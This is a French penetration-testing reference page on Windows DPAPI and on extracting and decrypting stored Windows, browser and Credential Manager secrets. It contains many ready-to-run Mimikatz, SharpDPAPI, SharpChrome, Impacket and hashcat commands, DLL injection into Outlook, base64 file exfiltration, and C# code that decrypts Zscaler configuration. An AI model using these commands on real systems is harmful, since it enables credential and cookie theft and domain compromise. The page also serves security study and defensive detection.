# DPAPI - Extraction de mots de passe

{{#include ../../banners/hacktricks-training.md}}



## Qu'est-ce que le DPAPI

La Data Protection API (DPAPI) est principalement utilisée dans le système d'exploitation Windows pour le **chiffrement symétrique de clés privées asymétriques**, en tirant parti de secrets utilisateur ou système comme source importante d'entropie. Cette approche simplifie le chiffrement pour les développeurs en leur permettant de chiffrer des données à l'aide d'une clé dérivée des secrets de connexion de l'utilisateur ou, pour le chiffrement système, des secrets d'authentification du domaine du système, évitant ainsi aux développeurs de devoir gérer eux-mêmes la protection de la clé de chiffrement.

La manière la plus courante d'utiliser le DPAPI consiste à passer par les fonctions **`CryptProtectData` et `CryptUnprotectData`**, qui permettent aux applications de chiffrer et de déchiffrer des données de manière sécurisée avec la session du processus actuellement connecté. Cela signifie que les données chiffrées ne peuvent être déchiffrées que par le même utilisateur ou système que celui qui les a chiffrées.

De plus, ces fonctions acceptent également un **paramètre `entropy`** qui sera aussi utilisé lors du chiffrement et du déchiffrement. Par conséquent, pour déchiffrer un élément chiffré avec ce paramètre, vous devez fournir la même valeur d'entropie que celle utilisée lors du chiffrement.

### Génération de la clé utilisateur

Le DPAPI génère une clé unique (appelée **`pre-key`**) pour chaque utilisateur à partir de ses identifiants. Cette clé est dérivée du mot de passe de l'utilisateur et d'autres facteurs, et l'algorithme dépend du type d'utilisateur, mais aboutit à une valeur SHA1. Par exemple, pour les utilisateurs de domaine, **elle dépend du hash NTLM de l'utilisateur**.

Cela est particulièrement intéressant, car si un attaquant parvient à obtenir le hash du mot de passe de l'utilisateur, il peut :

- **Déchiffrer toutes les données chiffrées à l'aide du DPAPI** avec la clé de cet utilisateur, sans avoir besoin de contacter une API
- Tenter de **cracker le mot de passe** hors ligne en essayant de générer la clé DPAPI valide

De plus, chaque fois que des données sont chiffrées par un utilisateur à l'aide du DPAPI, une nouvelle **master key** est générée. Cette master key est celle qui est réellement utilisée pour chiffrer les données. Chaque master key reçoit un **GUID** (Globally Unique Identifier) qui l'identifie.

Les master keys sont stockées dans le répertoire **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, où `{SID}` est le Security Identifier de cet utilisateur. La master key est stockée chiffrée avec la **`pre-key`** de l'utilisateur, ainsi qu'avec une **domain backup key** pour la récupération (la même clé est donc stockée chiffrée 2 fois avec 2 mots de passe différents).

Notez que la **domain key utilisée pour chiffrer la master key se trouve dans les contrôleurs de domaine et ne change jamais**. Ainsi, si un attaquant a accès au contrôleur de domaine, il peut récupérer la domain backup key et déchiffrer les master keys de tous les utilisateurs du domaine.<sup>[[2]](#references)</sup>

Les blobs chiffrés contiennent le **GUID de la master key** utilisée pour chiffrer les données dans leurs en-têtes.

> [!TIP]
> Les blobs chiffrés par le DPAPI commencent par **`01 00 00 00`**

Trouver les master keys :
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Voici à quoi ressemblent plusieurs Master Keys d’un utilisateur :

![What is DPAPI - Users key generation: Voici à quoi ressemblent plusieurs Master Keys d’un utilisateur](<../../images/image (1121).png>)

### Génération des clés Machine/System

Cette clé est utilisée par la machine pour chiffrer les données. Elle est basée sur le **secret LSA DPAPI_SYSTEM**, qui est une clé spéciale à laquelle seul l’utilisateur SYSTEM peut accéder. Cette clé est utilisée pour chiffrer les données qui doivent être accessibles au système lui-même, telles que les identifiants au niveau de la machine ou les secrets à l’échelle du système.<sup>[[2]](#references)</sup>

Notez que ces clés **n’ont pas de sauvegarde de domaine** et sont donc uniquement accessibles localement :

- **Mimikatz** peut y accéder en dumpant les secrets LSA à l’aide de la commande : `mimikatz lsadump::secrets`
- Le secret est stocké dans le registre, un administrateur pourrait donc **modifier les permissions DACL pour y accéder**. Le chemin du registre est : `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- L’extraction offline depuis les ruches du registre est également possible. Par exemple, en tant qu’administrateur sur la cible, sauvegardez les ruches et exfiltrez-les :
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Ensuite, sur votre poste d’analyse, récupérez le secret LSA DPAPI_SYSTEM depuis les hives et utilisez-le pour déchiffrer les blobs de portée machine (mots de passe des tâches planifiées, identifiants des services, profils Wi-Fi, etc.) :
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Données protégées par DPAPI

Parmi les données personnelles protégées par DPAPI figurent :

- Identifiants Windows
- Mots de passe et données de saisie automatique d'Internet Explorer et de Google Chrome
- Mots de passe des comptes de messagerie et des comptes FTP internes pour des applications comme Outlook et Windows Mail
- Mots de passe des dossiers partagés, des ressources, des réseaux sans fil et de Windows Vault, y compris les clés de chiffrement
- Mots de passe des connexions Remote Desktop, de .NET Passport et clés privées à diverses fins de chiffrement et d'authentification
- Mots de passe réseau gérés par Credential Manager et données personnelles dans les applications utilisant CryptProtectData, telles que Skype, MSN messenger, et bien d'autres
- Blobs chiffrés dans le registre
- ...

Les données protégées par le système comprennent :
- Mots de passe Wi-Fi
- Mots de passe des tâches planifiées
- ...

### Options d'extraction des clés principales

- Si l'utilisateur dispose de privilèges d'administrateur du domaine, il peut accéder à la **clé de sauvegarde du domaine** pour déchiffrer toutes les clés principales des utilisateurs du domaine :
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Avec des privilèges d’administrateur local, il est possible d’**accéder à la mémoire de LSASS** pour extraire les clés maîtresses DPAPI de tous les utilisateurs connectés ainsi que la clé SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Si l’utilisateur dispose de privilèges d’administrateur local, il peut accéder au **DPAPI_SYSTEM LSA secret** pour déchiffrer les clés principales de la machine :
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Si le mot de passe ou le hash NTLM de l'utilisateur est connu, vous pouvez **décrypter directement les clés maîtresses de l'utilisateur** :
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Si vous êtes dans une session en tant que l’utilisateur, il est possible de demander au DC la **clé de sauvegarde pour déchiffrer les clés principales via RPC**. Si vous êtes administrateur local et que l’utilisateur est connecté, vous pouvez **voler son jeton de session** à cette fin :
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lister le Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Accéder aux données chiffrées par DPAPI

### Trouver les données chiffrées par DPAPI

Les fichiers couramment protégés des utilisateurs se trouvent dans :

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Vérifiez également en remplaçant `\Roaming\` par `\Local\` dans les chemins ci-dessus.

Exemples d’énumération :
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) peut trouver des blobs chiffrés avec DPAPI dans le système de fichiers, le registre et les blobs B64 :
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Notez que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (du même repo) peut être utilisé pour déchiffrer, via DPAPI, des données sensibles comme les cookies.

#### Recettes rapides Chromium/Edge/Electron (SharpChrome)

- Utilisateur actuel, déchiffrement interactif des identifiants/cookies enregistrés (fonctionne même avec les app-bound cookies de Chrome 127+ car la clé supplémentaire est récupérée depuis le Credential Manager de l’utilisateur lors de l’exécution dans le contexte utilisateur) :
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Analyse hors ligne lorsque vous disposez uniquement des fichiers. Extrayez d’abord la clé d’état AES depuis le fichier « Local State » du profil, puis utilisez-la pour déchiffrer la base de données des cookies :
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triage à l’échelle du domaine/à distance lorsque vous disposez de la clé de sauvegarde du domaine DPAPI (PVK) et des droits admin sur l’hôte cible :
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Si vous disposez de la prekey/credkey DPAPI d’un utilisateur (depuis LSASS), vous pouvez éviter le password cracking et déchiffrer directement les données du profil :
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notes
- Les versions plus récentes de Chrome/Edge peuvent stocker certains cookies avec un chiffrement « App-Bound ». Le déchiffrement hors ligne de ces cookies spécifiques n’est pas possible sans la clé App-Bound supplémentaire ; exécutez SharpChrome dans le contexte de l’utilisateur cible pour la récupérer automatiquement. Consultez l’article du blog sur la sécurité de Chrome référencé ci-dessous.<sup>[[5]](#references)</sup>

### Accéder aux clés et aux données

- **Utilisez SharpDPAPI** pour obtenir les identifiants à partir de fichiers chiffrés par DPAPI de la session actuelle :
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Obtenir les informations d’identification** comme les données chiffrées et le guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Accéder aux masterkeys** :

Déchiffrer une masterkey d’un utilisateur demandant la **domain backup key** via RPC :
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
L’outil **SharpDPAPI** prend également en charge ces arguments pour le déchiffrement des masterkeys (notez qu’il est possible d’utiliser `/rpc` pour obtenir la clé de sauvegarde du domaine, `/password` pour utiliser un mot de passe en clair, ou `/pvk` pour spécifier un fichier de clé privée DPAPI du domaine...) :<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Déchiffrer des données à l'aide d'une masterkey** :
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
L’outil **SharpDPAPI** prend également en charge ces arguments pour le déchiffrement de `credentials|vaults|rdg|keepass|triage|blob|ps` (notez qu’il est possible d’utiliser `/rpc` pour obtenir la clé de sauvegarde du domaine, `/password` pour utiliser un mot de passe en clair, `/pvk` pour spécifier un fichier contenant la clé privée DPAPI du domaine, `/unprotect` pour utiliser la session de l’utilisateur actuel...) :<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Utiliser directement une prekey/credkey DPAPI (aucun mot de passe requis)

Si vous pouvez dumper LSASS, Mimikatz expose souvent une clé DPAPI par session de connexion, qui peut être utilisée pour déchiffrer les masterkeys de l’utilisateur sans connaître le mot de passe en clair. Passez directement cette valeur à l’outil :
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Déchiffrer certaines données à l’aide de la **session de l’utilisateur actuel** :
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Déchiffrement hors ligne avec Impacket dpapi.py

Si vous disposez du SID et du mot de passe de l’utilisateur victime (ou du NT hash), vous pouvez déchiffrer entièrement hors ligne les masterkeys DPAPI et les blobs de Credential Manager à l’aide de dpapi.py d’Impacket.<sup>[[10]](#references)[[11]](#references)</sup>

- Identifier les artefacts sur le disque :
- Blob(s) de Credential Manager : %APPDATA%\Microsoft\Credentials\<hex>
- masterkey correspondante : %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Si l’outil de transfert de fichiers est instable, encodez les fichiers en base64 sur l’hôte et copiez la sortie :
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Déchiffrer la masterkey avec le SID et le mot de passe/hash de l’utilisateur :
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Utilisez la masterkey déchiffrée pour déchiffrer le credential blob :
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Ce workflow permet souvent de récupérer les identifiants de domaine enregistrés par les applications utilisant le Windows Credential Manager, y compris les comptes administratifs (par ex. `*_adm`).

---

### Gestion de l’entropie facultative (« Third-party entropy »)

Certaines applications transmettent une valeur d’**entropie** supplémentaire à `CryptProtectData`. Sans cette valeur, le blob ne peut pas être déchiffré, même si la masterkey correcte est connue. L’obtention de l’entropie est donc essentielle lors du ciblage d’identifiants protégés de cette manière (par ex. Microsoft Outlook et certains clients VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) est une DLL en mode utilisateur qui hooke les fonctions DPAPI au sein du processus cible et enregistre de manière transparente toute entropie facultative fournie. L’exécution d’EntropyCapture en mode **DLL-injection** contre des processus tels que `outlook.exe` ou `vpnclient.exe` génère un fichier associant chaque buffer d’entropie au processus appelant et au blob. L’entropie capturée peut ensuite être fournie à **SharpDPAPI** (`/entropy:`) ou à **Mimikatz** (`/entropy:<file>`) afin de déchiffrer les données.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking de masterkeys hors ligne (Hashcat & DPAPISnoop)

Microsoft a introduit un format de masterkey **context 3** à partir de Windows 10 v1607 (2016). `hashcat` v6.2.6 (décembre 2023) a ajouté les **hash-modes** **22100** (DPAPI masterkey v1 context ), **22101** (context 1) et **22102** (context 3), permettant le cracking accéléré par GPU des mots de passe utilisateur directement depuis le fichier masterkey. Les attackers peuvent donc effectuer des attaques par liste de mots ou par brute-force sans interagir avec le système cible.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automatise le processus :
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
L'outil peut également analyser les blobs Credential et Vault, les déchiffrer avec des clés crackées et exporter les mots de passe en clair.<sup>[[8]](#references)</sup>


### Accéder aux données d'une autre machine

Dans **SharpDPAPI et SharpChrome**, vous pouvez indiquer l'option **`/server:HOST`** pour accéder aux données d'une machine distante. Bien sûr, vous devez pouvoir accéder à cette machine et, dans l'exemple suivant, on suppose que la **clé de chiffrement de sauvegarde du domaine est connue** :
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Other tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) est un outil qui automatise l’extraction de tous les utilisateurs et ordinateurs depuis l’annuaire LDAP, ainsi que l’extraction de la clé de sauvegarde du contrôleur de domaine via RPC. Le script résout ensuite l’adresse IP de tous les ordinateurs et effectue un smbclient sur chacun d’eux afin de récupérer tous les blobs DPAPI de tous les utilisateurs et de tout déchiffrer avec la clé de sauvegarde du domaine.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Avec la liste des ordinateurs extraite de LDAP, vous pouvez trouver chaque sous-réseau, même si vous ne les connaissiez pas !

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) peut dumper automatiquement les secrets protégés par DPAPI. La version 2.x a introduit :<sup>[[9]](#references)</sup>

* La collecte parallèle de blobs depuis des centaines d’hôtes
* L’analyse des masterkeys de **context 3** et l’intégration automatique du cracking avec Hashcat
* La prise en charge des cookies chiffrés « App-Bound » de Chrome (voir la section suivante)
* Un nouveau mode **`--snapshot`** pour interroger régulièrement les endpoints et comparer les blobs nouvellement créés

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) est un parser C# pour les fichiers masterkey/credential/vault, capable de produire des formats Hashcat/JtR et, en option, de lancer automatiquement le cracking. Il prend entièrement en charge les formats de masterkeys machine et utilisateur jusqu’à Windows 11 24H1.<sup>[[8]](#references)</sup>


## Détections courantes

- Accès aux fichiers dans `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` et les autres répertoires liés à DPAPI.
- En particulier depuis un partage réseau comme **C$** ou **ADMIN$**.
- Utilisation de **Mimikatz**, **SharpDPAPI** ou d’outils similaires pour accéder à la mémoire de LSASS ou dumper les masterkeys.
- Événement **4662** : *Une opération a été effectuée sur un objet* – peut être corrélé à l’accès à l’objet **`BCKUPKEY`**.
- Événement **4673/4674** lorsqu’un processus demande *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnérabilités et évolutions de l’écosystème 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembre 2023). Un attaquant disposant d’un accès réseau pouvait piéger un membre du domaine afin qu’il récupère une clé de sauvegarde DPAPI malveillante, permettant le déchiffrement des masterkeys utilisateur. Corrigé dans la mise à jour cumulative de novembre 2023 – les administrateurs doivent s’assurer que les DC et les postes de travail sont entièrement mis à jour.<sup>[[4]](#references)</sup>
* **Chiffrement des cookies « App-Bound » de Chrome 127** (juillet 2024) : a remplacé la protection historique reposant uniquement sur DPAPI par une clé supplémentaire stockée dans le **Credential Manager** de l’utilisateur. Le déchiffrement hors ligne des cookies nécessite désormais à la fois la masterkey DPAPI et la **clé app-bound encapsulée avec GCM**. SharpChrome v2.3 et DonPAPI 2.x peuvent récupérer la clé supplémentaire lorsqu’ils s’exécutent dans le contexte de l’utilisateur.<sup>[[5]](#references)</sup>


### Étude de cas : Zscaler Client Connector – Entropie personnalisée dérivée du SID

Zscaler Client Connector stocke plusieurs fichiers de configuration sous `C:\ProgramData\Zscaler` (par exemple, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Chaque fichier est chiffré avec **DPAPI (Machine scope)**, mais le fournisseur fournit une **custom entropy** qui est *calculée à l’exécution* au lieu d’être stockée sur le disque.<sup>[[1]](#references)</sup>

L’entropie est reconstruite à partir de deux éléments :

1. Un secret codé en dur intégré dans `ZSACredentialProvider.dll`.
2. Le **SID** du compte Windows auquel appartient la configuration.

L’algorithme implémenté par la DLL est équivalent à :
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Parce que le secret est intégré dans une DLL lisible depuis le disque, **tout attaquant local disposant des droits SYSTEM peut régénérer l’entropie pour n’importe quel SID** et déchiffrer les blobs hors ligne :
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Le déchiffrement révèle la configuration JSON complète, y compris chaque **device posture check** et sa valeur attendue – des informations très précieuses pour tenter des contournements côté client.

> CONSEIL : les autres artefacts chiffrés (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sont protégés avec DPAPI **sans entropie** (`16` octets nuls). Ils peuvent donc être déchiffrés directement avec `ProtectedData.Unprotect` une fois les privilèges SYSTEM obtenus.

## References

- [1] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. Security analysis and data recovery in DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Reading DPAPI Encrypted Secrets with Mimikatz and C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Improving the security of Chrome cookies on Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Simple Extraction of DPAPI Optional Entropy](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
